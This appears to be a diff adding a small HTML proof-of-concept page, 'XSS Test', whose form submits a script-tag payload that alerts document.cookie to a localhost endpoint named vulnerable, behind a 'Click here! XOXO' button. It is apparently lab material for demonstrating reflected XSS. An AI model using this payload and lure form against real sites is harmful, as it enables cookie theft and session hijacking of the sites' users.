@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<title>XSS Test</title>
+		<script type="text/javascript">
+			sendEvilScript = (event) => {
+				// document.cookie = "blah blah";
+				event.preventDefault();
+				form = document.getElementById("xss");
+				ip = document.createElement("input");
+				ip.type = "text";
+				ip.name = "q";
+				hackstr = "<script type='text/javascript'>alert(document.cookie);<\/script>";
+
+				ip.value = hackstr;
+				form.appendChild(ip);
+
+				form.submit();
+				form.removeChild(ip);
+
+			}
+		</script>
+	</head>
+
+	<body>
+		<!-- <img src="http://localhost:62020/api/v1/vulnerable?q=<script type='text/javascript'>alert(document.cookie);<\/script>"
+			alt=""> -->
+		<form id="xss" action="http://localhost:62020/api/v1/vulnerable" method="GET" onsubmit="sendEvilScript(event)">
+			<input type="submit" value="Click here! XOXO">
+		</form>
+	</body>
+
+</html>
